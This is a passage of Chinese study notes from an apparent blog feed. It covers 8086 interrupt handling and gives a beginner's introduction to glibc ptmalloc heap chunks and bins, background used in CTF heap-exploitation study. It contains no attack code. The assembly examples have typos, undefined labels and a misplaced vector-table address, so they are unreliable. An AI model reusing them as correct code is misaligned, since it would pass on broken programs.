plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ds:ds指向字符串;要显示的字符串需用&quot;$&quot;作为结束符</span><br><span class="line">mov ah,9   ;功能号9，表示在光标位置显示字符串</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编笔记05</title>
      <link href="/2020/02/10/8086%E2%95%97%CF%80%E2%96%92%CE%B1%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F05/"/>
      <url>/2020/02/10/8086%E2%95%97%CF%80%E2%96%92%CE%B1%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F05/</url>
      
        <content type="html"><![CDATA[<h2 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h2><p>中断是CPU处理外部突发事件的一个重要技术，它能使CPU在运行过程中对外部事件发出的中断请求及时地进行处理，处理完成后又立即返回断点，继续进行CPU原来的工作。引起中断的原因或者说发出中断请求的来源叫做中断源。根据中断源的不同，可以把中断分为<strong>硬件中断</strong>和<strong>软件中断</strong>两大类，而硬件中断又可以分为<strong>外部中断</strong>和<strong>内部中断</strong>两类</p><p>CPU为了处理并发的中断请求，规定了中断的优先权，中断优先权由高到低的顺序是：</p><ol><li>除法错、溢出中断、软件中断</li><li>不可屏蔽中断</li><li>可屏蔽中断</li><li>单步中断s</li></ol><h2 id="外部中断"><a href="#外部中断" class="headerlink" title="外部中断"></a>外部中断</h2><p>外部中断一般是指由计算机外设发出的中断请求，如：键盘中断、打印机中断、定时器中断等。外部中断使可以屏蔽的中断，也就是说，利用中断控制器可以屏蔽这些外部设备的中断请求</p><h2 id="内部中断"><a href="#内部中断" class="headerlink" title="内部中断"></a>内部中断</h2><p>内部中断是指因硬件出错（突然掉电、奇偶校验错等）或运算出错（除数为零、运算溢出、单步中断等）所引起的中断。内部中断是不可屏蔽的中断</p><h2 id="软件中断"><a href="#软件中断" class="headerlink" title="软件中断"></a>软件中断</h2><p>软件中断其实并不是真正的中断，它们只是可被调用执行的一般程序以及DOS的系统功能调用（INT 21H）等都是软件中断</p><h2 id="中断处理程序"><a href="#中断处理程序" class="headerlink" title="中断处理程序"></a>中断处理程序</h2><p>CPU的设计者必须在中断信息和其处理程序的入口地址之间建立某种联系，使得CPU根据中断信息可以找到要执行的处理程序。中断信息中包含有标识中断源的类型码，根据CPU的设计，中断类型码的作用就是用来定位中断处理程序，比如CPU根据中断程序码4，就可以找到4号中断的处理程序</p><p>若要定位中断处理程序，需要知道它的段地址和偏移地址，如果需要根据8位的中断类型码（8086中断类型码为一个字节）得到中断处理程序的段地址和偏移地址，需要引入“中断向量表”</p><h2 id="中断向量表"><a href="#中断向量表" class="headerlink" title="中断向量表"></a>中断向量表</h2><p>CPU用8位的中断类型码通过中断向量表找到相应的中断处理程序的入口地址，中断向量表就是中断向量的列表</p><table><thead><tr><th align="center">0号中断元对应的中断处理程序的入口地址</th></tr></thead><tbody><tr><td align="center"><strong>1号中断元对应的中断处理程序的入口地址</strong></td></tr><tr><td align="center"><strong>2号中断元对应的中断处理程序的入口地址</strong></td></tr><tr><td align="center"><strong>……</strong></td></tr></tbody></table><p>中断向量表在内存中保存，其中存放着256个中断源所对应的中断处理程序的入口。<strong>对于8086PC机，中断向量表指定放在内存地址0处，从内存0000:0000到0000:03FF的1024个单元</strong></p><h2 id="中断过程"><a href="#中断过程" class="headerlink" title="中断过程"></a>中断过程</h2><p>CPU硬件完成中断工作的过程被称为中断过程：</p><ul><li>利用中断类型码，在中断向量表中找到中断处理程序的入口</li><li>找到这个入口地址的最终目的是用它设置CS和IP，使CPU执行中断处理程序</li><li>用中断类型码找到中断向量，并用它设置CS和IP，这个工作是由CPU的硬件自动完成的</li></ul><p>8086CPU的中断过程：</p><ul><li>从中断信息中取得中断类型码</li><li>标志寄存器的值入栈（保护标志位）</li><li>设置标志寄存器的第8位TF和第9位IF的值为0</li><li>CS的内容入栈</li><li>IP的内容入栈</li><li>从内存地址为中断类型码*4和中断类型码*4+2的两个字单元中读取中断处理程序的入口地址设置IP和CS</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.取得中断类型码N；</span><br><span class="line">2.pushf</span><br><span class="line">3.TF=0，IF=0</span><br><span class="line">4.push CS</span><br><span class="line">5.push IP</span><br><span class="line">6.(IP)=(N*4)，(CS)=(N*4+2)</span><br></pre></td></tr></table></figure><h2 id="中断处理程序-1"><a href="#中断处理程序-1" class="headerlink" title="中断处理程序"></a>中断处理程序</h2><p>由于CPU随时都可能检测到中断信息，也就是说，CPU随时都可能执行中断处理程序，所以中断处理程序必须一直存储在内存某段空间之中，而中断处理程序的入口地址，即中断向量，必须存储在对应的中断向量表表项中</p><p>中断处理程序的编写方法和子程序的比较相似，下面是常规的步骤：</p><ul><li>保存用到的寄存器</li><li>处理中断</li><li>恢复用到的寄存器</li><li>用iret指令返回<ul><li>iret指令的功能用汇编语法描述为：<ul><li>pop IP</li><li>pop CS</li><li>popf</li></ul></li><li>iret通常和硬件自动完成的中断过程配合使用</li></ul></li></ul><p>可以看到，在中断过程中，寄存器入栈的顺序是标志寄存器、CS、IP，而iret的出栈顺序是IP、CS、标志寄存器，刚好和其对应，实现了用执行中断处理程序前的CPU现场恢复标志寄存器和CS、IP的工作</p><h2 id="除法错误中断的处理"><a href="#除法错误中断的处理" class="headerlink" title="除法错误中断的处理"></a>除法错误中断的处理</h2><p>当CPU执行div等除法指令的时候，如果发生了除法溢出错误，将产生中断类型码为0的中断信息，CPU将检测到这个信息，然后引发中断过程，转去执行0号中断所对应的中断处理程序</p><h2 id="编程处理0号中断"><a href="#编程处理0号中断" class="headerlink" title="编程处理0号中断"></a>编程处理0号中断</h2><ul><li>当发生除法溢出的时候，产生0号中断信息，从而引发中断过程，此时CPU经行以下工作<ul><li>取得中断类型码0</li><li>标志寄存器入栈，TF、IF设置为0</li><li>CS、IP入栈</li><li>(IP)=(0<em>4)，(CS)=(0\</em>4+2)</li></ul></li><li>可见当中断0发生时，CPU将去执行处理程序，要显示特定字符串只需这样写：<ul><li>相关处理</li><li>向显示缓冲区送字符串”Welcome to”</li><li>返回DOS</li></ul></li><li>必须将do 0 的入口地址等级在中断向量表的对应表项中，因为除法溢出对应的中断类型码为0则：<ul><li>入口地址应该从0x4地址单元开始存放</li><li>段地址存放在0x4+2字单元中</li><li>偏移地址存放在0x4字单元中</li></ul></li><li>总结上面的分析：<ul><li>编写可以显示字符串的中断处理程序：do 0</li><li>将do 0送入内存0000:0200处</li><li>将do 0的入口地址0000:0200存储在中断向量表0号表项中</li></ul></li></ul><p>普通的示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">data segment</span><br><span class="line">        db &quot;Hello World!&quot;</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">        mov ax,cs </span><br><span class="line">        mov ds,ax</span><br><span class="line">        mov si,offser dp0   ;设置ds:si指向源地址</span><br><span class="line">        mov ax,0</span><br><span class="line">        mov es,ax</span><br><span class="line">        mov di,200h         ;设置es:di指向目的地址</span><br><span class="line">        mov cx,offset do0end- offset do0    ;设置cx为传输长度</span><br><span class="line">        cld                 ;设置传输方向为正</span><br><span class="line">        rep movsb</span><br><span class="line"></span><br><span class="line">        mov ax,0;设置中断向量表</span><br><span class="line">        mov es,ax</span><br><span class="line">        mov word ptr es:[0*4],200h</span><br><span class="line">        mov word ptr es:[0*4+2],0</span><br><span class="line"></span><br><span class="line">        mov ax,4c00h</span><br><span class="line">        int 21h</span><br><span class="line">do0:    ;显示字符串</span><br><span class="line">        mov ax,data </span><br><span class="line">        mov ds,ax</span><br><span class="line">        mov si,0            ;设置ds:si指向字符串</span><br><span class="line">        mov ax,0b800h</span><br><span class="line">        mov es,ax</span><br><span class="line">        mov di,12*160+36*2  ;设置es:di指向显存空间的中间位置</span><br><span class="line">        mov cx,21           ;设置cx为字符串长度</span><br><span class="line">doend:</span><br><span class="line">        nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br><span class="line">;&quot;-&quot;是编译器可以识别的运算符号，两个常数的减法，编译器还可以处理很多表达式</span><br></pre></td></tr></table></figure><p>但是这样有一个问题，字符串存放在程序的data段中。程序执行完成后返回，它所占用的内存空间被系统释放，而在其中存放的字符串也将很可能被别的信息覆盖，很难保证do0程序从原来程序program1所处的空间中取得的是要显示的字符串。所以该字符串也应该存放在一段不会被覆盖的空间中</p><p>所以，改进后将数据存放到代码段中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">        mov ax,cs </span><br><span class="line">        mov ds,ax</span><br><span class="line">        mov si,offser dp0   ;设置ds:si指向源地址</span><br><span class="line">        mov ax,0</span><br><span class="line">        mov es,ax</span><br><span class="line">        mov di,200h         ;设置es:di指向目的地址</span><br><span class="line">        mov cx,offset do0end- offset do0    ;设置cx为传输长度</span><br><span class="line">        cld                 ;设置传输方向为正</span><br><span class="line">        rep movsb</span><br><span class="line"></span><br><span class="line">        mov ax,0;设置中断向量表</span><br><span class="line">        mov es,ax</span><br><span class="line">        mov word ptr es:[0*4],200h</span><br><span class="line">        mov word ptr es:[0*4+2],0</span><br><span class="line">        </span><br><span class="line">        mov ax,4c00h</span><br><span class="line">        int 21h</span><br><span class="line">do0:    </span><br><span class="line">        jmp short do0start</span><br><span class="line">        db  &quot;Hello World&quot;   ;将数据存放在代码段</span><br><span class="line">do0start:</span><br><span class="line">        mov ax,cs</span><br><span class="line">        mov ds,ax</span><br><span class="line">        mov si,202h         ;设置ds:si指向字符串</span><br><span class="line">        mov ax,0b800h</span><br><span class="line">        mov es,ax</span><br><span class="line">        mov di,12*160+36*2  ;设置es:di指向显存空间的中间位置</span><br><span class="line">        mov cx,21           ;设置cx为字符串长度</span><br><span class="line">doend:</span><br><span class="line">        nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="单步中断"><a href="#单步中断" class="headerlink" title="单步中断"></a>单步中断</h2><p>只有CPU提供了在执行一条指令后就转去做其他事情的能力，Debug或是其他的程序才能利用CPU提供的这种功能做出我们使用T命令时的效果</p><p>CPU在执行完一条指令之后，如果检测到标志寄存器的TF位为1，则产生单步中断，引发终端过程</p><p>单步中断的中断类型码为1，则它所引发的中断过程如下：</p><ul><li>取得中断类型码1</li><li>标志寄存器入栈，TF、IF设置为0</li><li>CS、IP入栈</li><li>(IP)=(1<em>4),(CS)=(1\</em>4+2)</li></ul><p>所以如果TF=1，则执行一条指令后，CPU就要转去执行1号中断处理程序</p><p>在使用T命令执行指令时，Debug将TF设置为1，使得CPU在工作于单步中断方式下，则在CPU执行完这条指令后就引发单步中断，执行单步中断的中断处理程序，所有寄存器中的内容被显示在屏幕上，并且等待输入命令</p><h2 id="响应中断的特殊情况"><a href="#响应中断的特殊情况" class="headerlink" title="响应中断的特殊情况"></a>响应中断的特殊情况</h2><p>在有些情况下，CPU在执行完当前指令后，即便是发生中断，也不会响应</p><h4 id="在执行完向ss寄存器传送数据的指令后"><a href="#在执行完向ss寄存器传送数据的指令后" class="headerlink" title="在执行完向ss寄存器传送数据的指令后"></a>在执行完向ss寄存器传送数据的指令后</h4><p>这样做的主要原因是ss:sp联合指向栈，而对它们的设置应该连续完成，因为如果在执行完设置ss的指令后，没设置sp寄存器，CPU响应中断的话，压栈标志寄存器、CS和IP的值，ss:sp指向的不是正确的栈顶，将引起错误</p><p>我们应该利用这个特性，将设置ss和sp的指令连续存放，之间CPU不会引发中断过程</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>简明堆入门</title>
      <link href="/2020/02/07/%E2%95%9D%E2%89%A5%E2%94%9C%E2%89%88%E2%95%A2%E2%95%A4%E2%95%9A%CE%B4%E2%94%9C%E2%94%BC/"/>
      <url>/2020/02/07/%E2%95%9D%E2%89%A5%E2%94%9C%E2%89%88%E2%95%A2%E2%95%A4%E2%95%9A%CE%B4%E2%94%9C%E2%94%BC/</url>
      
        <content type="html"><![CDATA[<h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure><ul><li>系统会调用一些函数在内存中开辟一大片空间作为堆的分配使用空间</li><li>malloc函数再从这一片堆的分配使用空间中分配0x10大小的空间，将指向该空间的地址返回给ptr(系统分配未使用余下的空间称为<strong>topchunk</strong>)</li></ul><h2 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h2><p>我们称运行过程中被malloc分配的内存为一个chunk，这块内存在ptmalloc中用malloc_chunk结构体表示，当程序申请的chunk被free时，会被加入相应的空闲管理列表中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">fd = Forward pointer to next chunk</span></span><br><span class="line"><span class="comment">bk = Back pointer to previous chunk</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>prev_size：如果前一个chunk是空闲的，该域表示前一个chunk的大小，如果前一个chunk不空闲，该域无意义，被前一个chunk占用复用</li><li>size：当前chunk的大小，并且记录了当前chunk和前一个chunk的一些属性，二进制后三位是标志位</li><li>FD：记录了下一个被free的chunk（used only if free）</li><li>BK：记录了上一个被free的chunk（used only if free）</li><li>fd_nextsize和bk_nextsize，只在largebin使用，记录了上/下一个被free chunk的size</li></ul><p>chunk是有他的神奇之处的，chunk虽然由一个统一的结构体声明，但是在被使用时和空闲时却又有两种不同的状态</p><p>使用中的chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of previous chunk, <span class="keyword">if</span> allocated            | |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of chunk, in bytes                       |M|P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             User data starts here...                          .</span><br><span class="line">            .                                                               .</span><br><span class="line">            .             (malloc_usable_size() bytes)                      .</span><br><span class="line">            .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of chunk                                     |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>空闲中的chunk（被free后）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of previous chunk                            |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    `head:' |             Size of chunk, in bytes                         |P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Forward pointer to next chunk in <span class="built_in">list</span>             |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Back pointer to previous chunk in <span class="built_in">list</span>            |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Unused space (may be 0 bytes long)                .</span><br><span class="line">            .                                                               .</span><br><span class="line">            .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    `foot:' |             Size of chunk, in bytes                           |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><h2 id="chunk的复用技术"><a href="#chunk的复用技术" class="headerlink" title="chunk的复用技术"></a>chunk的复用技术</h2><p>chunk中的字段prev_size是可以复用的：</p><ul><li>如果前一个邻接的chunk块空闲，那么当前chunk块结构体内的prev_size字段记录的是前一个邻接chunk块的大小。这就是由当前chunk指针获得前一个空闲chunk地址的依据。宏<code>prev_chunk(p)</code>就是依赖这个假设实现的<ul><li>获得前一个chunk的地址：当前chunk的地址 - prev_size</li></ul></li><li>如果前一个邻接chunk在使用中，则当前chunk的prev_size的空间被前一个chunk借用中，其中的值是前一个chunk的内存内容，对当前chunk没有任何意义</li></ul><h2 id="使用中的chunk"><a href="#使用中的chunk" class="headerlink" title="使用中的chunk"></a>使用中的chunk</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of previous chunk, <span class="keyword">if</span> allocated            | |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of chunk, in bytes                       |M|P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             User data starts here...                          .</span><br><span class="line">            .                                                               .</span><br><span class="line">            .             (malloc_usable_size() bytes)                      .</span><br><span class="line">            .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of chunk                                     |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>在size字段中最后三位有AMP三个标志位，但是在结构体中却没有定义，我们当前只需要记住P标志位</p><ul><li>PREV_INUSE：记录前一个chunk块是否被分配</li></ul><p>ptmalloc使用chunk实现内存管理，对chunk的管理基于独特的边界标记法。最重要的是地址的对齐。在不同的平台下，每个chunk的最小大小，地址对齐方式是不同的（地址对齐：即需要满足某个字节大小的整数倍，提高效率），ptmalloc依赖平台定义的<strong>size_t</strong>长度，对于32位平台，<strong>size_t</strong>长度为<strong>4</strong>字节，对于64位平台，size_t长度可能为<strong>4</strong>字节，也可能为<strong>8</strong>字节，在Linux X86_64上为<strong>8</strong>字节（做题常用环境）</p><p>在64位平台下，一个使用中的chunk的大小的计算公式应该是：</p><ul><li>in_use_size =（用户请求大小+16byte-8byte）align to 8byte</li></ul><p>这里的16字节是因为需要存储<strong>prev_size</strong>和<strong>size</strong>域，但又因为向下一个chunk“借”了8字节（也就是<strong>prev_size</strong>域的复用），所以实际空间大小要减去8字节，每分配一个chunk的<strong>overhead</strong>为8字节，即SIZE_SZ的大小</p><p>ptmalloc的堆块大小在glibc中会加上前两个成员的大小（0x10大小），所以当你分配一个堆内存时，堆内存的最小大小一定为<strong>0x20</strong>（0x10+0x10 or 4*8），即使malloc没有指定大小，也要分配fd和bk成员，所以加起来就是malloc_chunk结构体的前4个成员的大小总和，这样换用二进制就是100000，size字段的低三位就永远不会被使用，低三位就被用来当作flag位</p><h2 id="堆的释放"><a href="#堆的释放" class="headerlink" title="堆的释放"></a>堆的释放</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(ptr);</span><br></pre></td></tr></table></figure><p>堆的释放一般都是用free函数实现。堆释放后，会被添加到相应的bins中进行管理，这里涉及到的结构体就是<strong>malloc_state</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> THREAD_STATS</span></span><br><span class="line">  <span class="comment">/* Statistics for locking.  Only used if THREAD_STATS is defined.  */</span></span><br><span class="line">  <span class="keyword">long</span> stat_lock_direct, stat_lock_loop, stat_lock_wait;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr      fastbins[NFASTBINS];</span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr        top;</span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr        last_remainder;</span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr        bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span>     binmap[BINMAPSIZE];</span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对于空闲的chunk，ptmalloc采用分箱式内存管理方式，根据空闲的chunk的大小和处于的状态将其放在四个不同的bin中，这四个空闲的chunk的容器包括：fast bins，unsort bin、small bins和large bins</p><h2 id="Bins"><a href="#Bins" class="headerlink" title="Bins"></a>Bins</h2><p>首先，glibc malloc分配了若干个bins，为了方便查找了，glibc提供了两个数组：fastbinY和binsBins，英文解释是垃圾桶，在这里就存放被free的chunk</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/CTF%E2%80%94%E2%80%94WriteUP/how2heap/15548795-49ecc4bc156e439a.png" alt="img"></p><p>fastbinsY是拥有10（NFASTBINS）个元素的数组，用于存放每个fast chunk链表头指针，所以fast bins最多包含10个fast chunk的<strong>单向</strong>链表</p><p>bins用于存储unstored bin，small bins和large bins的chunk链表头，small bins一共62个，large bins一共63个，加起来一共125个bin，是<strong>双向</strong>链表管理</p><h2 id="fastbins"><a href="#fastbins" class="headerlink" title="fastbins"></a>fastbins</h2><p>首先编写下面程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    <span class="built_in">free</span>(ptr2);</span><br><span class="line">    <span class="built_in">free</span>(ptr3);</span><br><span class="line">    <span class="built_in">free</span>(ptr4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GDB调试可得：</p><figure class="highlight c"><table><tr><td 